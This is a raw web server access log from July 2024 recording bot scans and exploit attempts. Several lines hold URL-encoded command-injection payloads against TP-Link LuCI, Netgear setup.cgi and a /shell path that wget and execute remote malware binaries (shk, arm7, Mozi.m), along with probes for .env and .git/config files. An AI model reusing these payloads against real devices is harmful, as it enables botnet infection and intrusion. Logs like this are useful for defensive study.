57.129.23.166 - - [07/Jul/2024:20:14:46 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [07/Jul/2024:20:14:46 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
141.98.83.197 - - [07/Jul/2024:20:29:44 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.98.83.197 - - [07/Jul/2024:20:44:03 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
141.98.83.197 - - [07/Jul/2024:20:44:03 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(sh+-c+%27chmod+777+%2Fsbin%2Freboot%3B+%2Fsbin%2Freboot%3B+chmod+777+%2Fbin%2Freboot%3B+%2Fbin%2Freboot%3B+reboot%3B%27+%26) HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
124.220.11.157 - - [07/Jul/2024:20:49:54 +0000] "GET /shell?cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F45.95.147.201%2Fbins%2Farm7%3B%20chmod%20777%20arm7%3B%20.%2Farm7%20jaws%3B HTTP/1.1\x5Cr\x5CnUser-Agent: Mozila/5.0\x5Cr\x5CnHost: 127.0.0.1:80\x5Cr\x5CnAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\x5Cr\x5CnConnection: keep-alive\x5Cr\x5Cn\x5Cr\x5Cn\x11" 400 154 "-" "-"
44.236.133.133 - - [07/Jul/2024:21:55:19 +0000] "GET / HTTP/1.1" 404 150 "-" "WizDynamicScanner/1.0"
92.249.48.202 - - [07/Jul/2024:22:26:26 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
57.129.23.166 - - [07/Jul/2024:22:29:21 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [07/Jul/2024:22:29:21 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.151.71.165 - - [07/Jul/2024:22:41:21 +0000] "GET /druid/index.html HTTP/1.1" 404 122 "-" "Mozilla/5.0 zgrab/0.x"
185.224.128.43 - - [07/Jul/2024:23:16:30 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.98.83.197 - - [07/Jul/2024:23:53:05 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
104.40.75.182 - - [08/Jul/2024:00:06:40 +0000] "GET /hudson HTTP/1.1" 404 122 "-" "Mozilla/5.0 zgrab/0.x"
57.129.23.166 - - [08/Jul/2024:00:08:03 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [08/Jul/2024:00:08:03 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
141.98.83.197 - - [08/Jul/2024:00:13:00 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
141.98.83.197 - - [08/Jul/2024:00:13:00 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.95.169.11%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
194.169.175.56 - - [08/Jul/2024:00:14:56 +0000] "GET / HTTP/1.1" 404 122 "-" "req/v3 (https://github.com/imroc/req)"
194.169.175.56 - - [08/Jul/2024:00:14:57 +0000] "GET /_profiler/empty/search/results HTTP/1.1" 404 122 "-" "req/v3 (https://github.com/imroc/req)"
45.79.181.223 - - [08/Jul/2024:00:33:24 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03V#\xF0\xAD@\xDB\xC0\xCC\xA33\xD7\xC4" 400 154 "-" "-"
88.214.25.62 - - [08/Jul/2024:00:47:48 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 154 "-" "-"
117.235.243.193 - - [08/Jul/2024:00:49:26 +0000] "GET / HTTP/1.1" 404 552 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
167.94.146.62 - - [08/Jul/2024:00:59:29 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
167.94.146.62 - - [08/Jul/2024:00:59:38 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.62 - - [08/Jul/2024:00:59:39 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
147.185.132.207 - - [08/Jul/2024:01:16:11 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03R\xAA\x8B\x14\xEE\xCA\xBC\x94\xB3m\xBDz:\xBA\xFE\x1A\xFDS\x18\xE0\xAC\xF2\xE1b\xEF\xEB\xB1\xF6\x1C[\xA7\xDB\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 154 "-" "-"
147.185.132.207 - - [08/Jul/2024:01:16:11 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xEC\xA98\x90\x1B\xBDY7\x99\x13\xE9\xCAjt+\xC7\xF3\xE4\xFC\xF3=\xBC\x8D\x00f\x97\xF8JJ4\x8A\xB7 \x8E\xA2\xFF'\x91\xFC\xE6\xEA\xD1\x95\xD8\x13\x0B\xDDN\xCD\xF3\xCE\xFF\xE2\x9Fw\xC8\xC0\xA7\xACh.\xBE2\x9C\xC5\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 154 "-" "-"
162.216.149.164 - - [08/Jul/2024:01:21:39 +0000] "GET / HTTP/1.1" 404 122 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
13.64.193.92 - - [08/Jul/2024:01:22:49 +0000] "GET /druid/index.html HTTP/1.1" 404 122 "-" "Mozilla/5.0 zgrab/0.x"
172.169.2.193 - - [08/Jul/2024:01:29:02 +0000] "GET /hudson HTTP/1.1" 404 122 "-" "Mozilla/5.0 zgrab/0.x"
198.235.24.154 - - [08/Jul/2024:01:40:59 +0000] "GET / HTTP/1.1" 404 122 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
34.140.108.54 - - [08/Jul/2024:01:49:26 +0000] "GET / HTTP/1.1" 404 122 "-" "python-requests/2.32.2"
94.156.248.3 - - [08/Jul/2024:01:50:12 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
83.97.73.245 - - [08/Jul/2024:01:51:57 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
48.217.66.241 - - [08/Jul/2024:01:54:28 +0000] "GET / HTTP/1.0" 404 150 "-" "-"
48.217.66.241 - - [08/Jul/2024:01:58:28 +0000] "GET /owa/auth/x.js HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
48.217.66.241 - - [08/Jul/2024:01:58:28 +0000] "GET / HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
48.217.66.241 - - [08/Jul/2024:01:58:29 +0000] "GET /wsman HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
48.217.66.241 - - [08/Jul/2024:01:58:29 +0000] "HEAD / HTTP/1.1" 404 0 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
48.217.66.241 - - [08/Jul/2024:01:59:13 +0000] "GET / HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
48.217.66.241 - - [08/Jul/2024:01:59:18 +0000] "HEAD / HTTP/1.1" 404 0 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
48.217.66.241 - - [08/Jul/2024:01:59:18 +0000] "GET / HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
141.98.83.197 - - [08/Jul/2024:02:06:17 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
54.176.140.22 - - [08/Jul/2024:02:08:40 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
45.79.181.104 - - [08/Jul/2024:02:38:23 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\x06\x9B\x114\xDF\x08~\x98\xFE\x91I\x82\x89\x18H\x06\x11\xF2\xA8m\x1E\x13\xCF\xE1]h\xFCv\xE6\xB4.\xA6\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
141.98.83.197 - - [08/Jul/2024:03:02:49 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
141.98.83.197 - - [08/Jul/2024:03:02:49 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.95.169.11%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
83.97.73.245 - - [08/Jul/2024:03:34:45 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
89.203.150.34 - - [08/Jul/2024:04:09:22 +0000] "GET / HTTP/1.1" 404 552 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
175.151.163.175 - - [08/Jul/2024:04:15:47 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://175.151.163.175:53544/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 150 "-" "-"
185.224.128.43 - - [08/Jul/2024:04:26:57 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
138.197.191.87 - - [08/Jul/2024:04:38:06 +0000] "\x16\x03\x01\x01\x17\x01\x00\x01\x13\x03\x03g\xDC=\xB6|\x92z\x8C\xBCp\x84Z\xEC\x06\xA5\x89\x5C\xCC\xF1U\xBA\xAA(\xD0\x1B\x92\x15O+AMZ k\xD6\xE1\x03\xE4\xF8y+\xDE\x93\xA2\xCC\xD8|Q\xFE\xC8'\xED\x8F\xEF\xBA*\xE0T?\xB6\xA6\xEC\x90\xD8(\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 154 "-" "-"
172.104.11.51 - - [08/Jul/2024:04:39:44 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\x00\xFE\xBE6\x7F\xA6\x00\x98!^\x8C\xD1\x13WH[\xE39\xE3\xA58}B#v)s\x17\xC5vvm\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
205.210.31.143 - - [08/Jul/2024:04:39:52 +0000] "GET / HTTP/1.0" 404 150 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
205.210.31.145 - - [08/Jul/2024:05:02:40 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03q0\x9Fp\xA0\x93\x134\xD5<S\xBCd\xE1\xC8\xF1\x9A\x96\xF1\xB5\x80f=|\x90}Y\x9E\x94\x03\xE8| \xCD\xE0\xDEdQ\xD6H\xE3z\xBB\x16\xA1\xF7l q\x04`X\xC6\xCD\xD6\xF3\x80\x0C\xD6\xC9H\x10\xA6s\xD8\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 154 "-" "-"
205.210.31.145 - - [08/Jul/2024:05:02:40 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xF28\x22\x08p\x84\x1E\x81\xF3\x8E\xB9\xAAP\xDF\xFA\xAD\xC7-=\xC9\xA2\xD3\xD4\xE1\xBF\xD6\x10X\xCF[" 400 154 "-" "-"
141.98.83.197 - - [08/Jul/2024:05:15:07 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
94.156.68.162 - - [08/Jul/2024:05:30:37 +0000] "GET /.git/config HTTP/1.1" 404 122 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Safari/605.1.15"
94.156.68.162 - - [08/Jul/2024:05:35:27 +0000] "GET /.git/config HTTP/1.1" 404 122 "-" "Mozilla/5.0 (OS/2; Warp 4.5; rv:45.0) Gecko/20100101 Firefox/45.0"
104.199.31.214 - - [08/Jul/2024:06:13:29 +0000] "GET / HTTP/1.1" 404 122 "-" "python-requests/2.32.2"
141.98.83.197 - - [08/Jul/2024:06:16:27 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
141.98.83.197 - - [08/Jul/2024:06:16:27 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.95.169.11%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
185.191.126.213 - - [08/Jul/2024:06:17:28 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
94.156.248.3 - - [08/Jul/2024:06:30:29 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
208.68.68.178 - - [08/Jul/2024:06:44:26 +0000] "GET / HTTP/1.1" 404 552 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
45.79.181.179 - - [08/Jul/2024:08:26:53 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x038a\x07\x96\xF4\xD6\x0E\xE1\x90\x90\xDDd\xC4\xA8i\xC5k\xCB\x9E\xBAh\xD7\xDC>=\xCF)\x90\xE3S\x7F\x12\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
185.191.126.213 - - [08/Jul/2024:08:36:44 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
31.220.1.83 - - [08/Jul/2024:08:41:32 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
141.98.83.197 - - [08/Jul/2024:08:44:51 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
59.184.77.109 - - [08/Jul/2024:09:21:47 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://59.184.77.109:59961/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 150 "-" "-"
74.82.47.4 - - [08/Jul/2024:09:22:07 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 OPR/108.0.0.0"
74.82.47.4 - - [08/Jul/2024:09:24:58 +0000] "GET /webui/ HTTP/1.1" 404 122 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0"
74.82.47.4 - - [08/Jul/2024:09:26:19 +0000] "GET /favicon.ico HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
74.82.47.4 - - [08/Jul/2024:09:27:28 +0000] "GET /geoserver/web/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 OPR/108.0.0.0"
141.98.83.197 - - [08/Jul/2024:09:31:08 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
141.98.83.197 - - [08/Jul/2024:09:31:08 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.95.169.11%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
71.6.232.25 - - [08/Jul/2024:09:36:50 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
34.89.113.117 - - [08/Jul/2024:09:51:53 +0000] "\x16\x03\x01\x00M\x01\x00\x00I\x03\x03p!\xDE\xB9\x1B\xFA\xED\xC9\xB2Mv\xB2\xF92\xA7\xDC\xF9\x8B\x95\x0B\xDBp )%*L\xDBui\x94\x10 G\x8A\xA5\x88\x1E\x9C\xE4\x80\xBB\xC8M{\xD5k\x9A6\x8B\xCB" 400 154 "-" "-"
34.89.113.117 - - [08/Jul/2024:09:51:55 +0000] "OPTIONS / HTTP/1.0" 404 150 "-" "-"
103.203.57.1 - - [08/Jul/2024:10:07:42 +0000] "GET / HTTP/1.1" 404 150 "-" "HTTP Banner Detection (https://security.ipip.net)"
185.224.128.43 - - [08/Jul/2024:10:07:55 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
92.249.48.202 - - [08/Jul/2024:10:22:52 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
172.206.143.165 - - [08/Jul/2024:12:01:57 +0000] "GET /actuator/health HTTP/1.1" 404 122 "-" "Mozilla/5.0 zgrab/0.x"
141.98.83.197 - - [08/Jul/2024:12:09:34 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
65.49.1.74 - - [08/Jul/2024:12:11:18 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x0EA\x9B\xA6\xA61\x9E\x84 \xC2\xE3_QXk#\x8AE+z\xF7y{\xFA\x18\x85W#\xFE1\x0F%\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
85.204.88.236 - - [08/Jul/2024:12:21:05 +0000] "GET / HTTP/1.1" 404 552 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
23.27.164.217 - - [08/Jul/2024:12:46:51 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
23.27.164.217 - - [08/Jul/2024:12:46:51 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
141.98.83.197 - - [08/Jul/2024:13:05:02 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
141.98.83.197 - - [08/Jul/2024:13:05:03 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.95.169.11%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
78.153.140.177 - - [08/Jul/2024:13:22:54 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [08/Jul/2024:13:22:54 +0000] "\x16\x03\x01\x01H\x01\x00\x01D\x03\x03\x80" 400 154 "-" "-"
66.175.213.4 - - [08/Jul/2024:13:56:17 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\xC3\xE2\xF2+\x1BmCA\x03X!\x1Dk\xB4\xED\xBC\xDA}\xAD\xC9U\xCC\xCE\x1B,\x99\xFC+\x1D\xF5r\xBF\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
94.156.68.162 - - [08/Jul/2024:14:27:39 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Linux; Android 9; SM-G965U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
104.152.52.150 - - [08/Jul/2024:14:31:55 +0000] "GET / HTTP/1.0" 404 150 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
94.156.68.162 - - [08/Jul/2024:14:39:38 +0000] "GET /.env HTTP/1.1" 404 122 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
185.224.128.43 - - [08/Jul/2024:14:53:50 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.98.83.197 - - [08/Jul/2024:15:20:40 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
